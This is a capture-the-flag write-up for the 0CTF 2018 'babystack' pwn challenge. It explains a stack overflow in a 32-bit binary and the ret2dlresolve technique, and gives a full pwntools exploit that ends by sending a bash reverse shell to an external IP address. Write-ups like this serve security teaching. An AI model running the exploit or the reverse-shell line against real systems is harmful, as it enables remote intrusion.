# 0CTF 2018 Quals: Baby Stack

> Challenge link: [babystack](http://dl.0ops.net/2018/babystack.tar.gz)
>
> Category: Pwn
>
> Writeup: []()
>

Info leak is no longer required to exploit a stack overflow in 2018.

Enjoy the babystack

202.120.7.202:6666

## Protection

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## Analysis

- ```pow.py```

It is a wrapper of babystack.
Add proof-of-work and limiting the length of input is ```0x100```; also pipe stdout and stderr to ```/dev/null```.

- ```babystack```

Just alarm and read buffer.

```c
ssize_t sub_804843B()
{
  char buf; // [esp+0h] [ebp-28h]

  return read(0, &buf, 0x40u);
}

int __cdecl main()
{
  alarm(0xAu);
  sub_804843B();
  return 0;
}
```

## Vulnerability

No canary found and we can read a lot of characters to buf.
- **Buffer overflow** in ```read(0, &buf, 0x40u)```

## Idea

- no output function => cannot do information leak
- no libc provided => guessing function offset maybe hard
- NX enabled => read shell code and jump to execute cannot work

According to the description, "info leak is no longer required", it means that we can use ret2dlresolve skill to pwn it!

Try to solve by the following steps:

1. use rop to read fake data structures and ret2main
2. use ret2dlresolve to call ```system("/bin/sh")```

Fake data structures:

- ```Elf32_Rel```

```
/* Relocation table entry without addend (in section of type SHT_REL).  */
typedef struct
{
  Elf32_Addr        r_offset;                /* Address */
  Elf32_Word        r_info;                        /* Relocation type and symbol index */
} Elf32_Rel;
```

https://code.woboq.org/userspace/glibc/elf/elf.h.html#633

- ```Elf32_Sym```

```
/* Symbol table entry.  */
typedef struct
{
  Elf32_Word        st_name;                /* Symbol name (string tbl index) */
  Elf32_Addr        st_value;                /* Symbol value */
  Elf32_Word        st_size;                /* Symbol size */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char        st_other;                /* Symbol visibility */
  Elf32_Section        st_shndx;                /* Section index */
} Elf32_Sym;
```

https://code.woboq.org/userspace/glibc/elf/elf.h.html#518

Working flow about ```_dl_runtime_resolve```

```
     _dl_runtime_resolve(link_map, reloc_arg)
                                       +
          +-----------+                |
          | Elf32_Rel | <--------------+
          +-----------+
     +--+ | r_offset  |        +-----------+
     |    |  r_info   | +----> | Elf32_Sym |
     |    +-----------+        +-----------+      +----------+
     |      .rel.plt           |  st_name  | +--> | system\0 |
     |                         |           |      +----------+
     v                         +-----------+        .dynstr
+----+-----+                      .dynsym
| <system> |
+----------+
  .got.plt
```

- fake ```Elf32_Rel```
    - ```r_offset``` writable (after resolving symbol write the actual address of function)
    - ```r_info``` high 24 bits
        - ```(r_info >> 8) * 16``` point to fake ```Elf32_Sym``` (16 is size of ```Elf32_Sym```)
    - ```r_info``` low 8 bits
        - must be ```0x07``` (R_386_JMP_SLOT)

- fake ```Elf32_Sym```
    - ```.dynstr + st_name``` point to ```system``` string

Read the fake ```Elf32_Rel```、```Elf32_Sym``` structures and ret2main to call ```_dl_runtime_resolve```.

- use ```plt0```

```
Disassembly of section .plt:

080482f0 <read@plt-0x10>:                                             // plt0
 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map
 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve
```

We can calculate the ```reloc_arg``` to make ```.rel.plt + reloc_arg``` point to our fake structures and jump to ```plt0```, let it resolve symbol to ```system```.

After resolving the symbol, ```_dl_runtime_resolve``` will call the function.

## Exploitation

```python
#!/usr/bin/env python

from pwn import *
from hashlib import sha256
import time

# r = process('./babystack')
r = remote('202.120.7.202', 6666)

def verify():
    data = r.recvline()[:-1]
    for i in xrange(2 ** 32):
        if sha256(data + p32(i)).digest().startswith('\0\0\0'):
            break
    r.send(p32(i))
    log.info('POW is over')
    sleep(0.5)

def send(data, length):
    time.sleep(0.1)
    r.send(data.ljust(length))

plt0 = 0x80482f0
relplt = 0x80482b0
dynsym = 0x80481cc
dynstr = 0x804822c

main = 0x8048457
read_plt = 0x8048300

buf = 0x804a500

rop = flat(
        # _dl_runtime_resolve call and reloc_arg
        plt0, buf - relplt, # will resolve system
        0xdeadbeef, # return address
        buf + 36 # parameter "/bin/sh"
        )

data = flat(
        # Elf32_Rel
        buf, 0x7 | ((buf + 12 - dynsym) / 16) << 8, 0xdeadbeef, # 0xdeadbeef is padding
        # Elf32_Sym
        buf + 28 - dynstr, 0, 0, 0x12,
        'system\x00\x00',
        '/bin/sh\x00'
        )

verify()

# read data to buf
send('a' * 44 + flat(read_plt, main, 0, buf, 44), 0x40)
send(data, 44)

# use ret2dlresolve to call system("/bin/sh")
send('a' * 44 + rop, 0x40)

# make a reverse shell
send('bash -c "bash -i &>/dev/tcp/35.201.141.84/80 0>&1"', 0x100)

r.interactive()
```

```flag{return_to_dlresolve_for_warming_up}```

## Note

https://www.slideshare.net/AngelBoy1/re2dlresolve
https://www.youtube.com/watch?v=wsIvqd9YqTI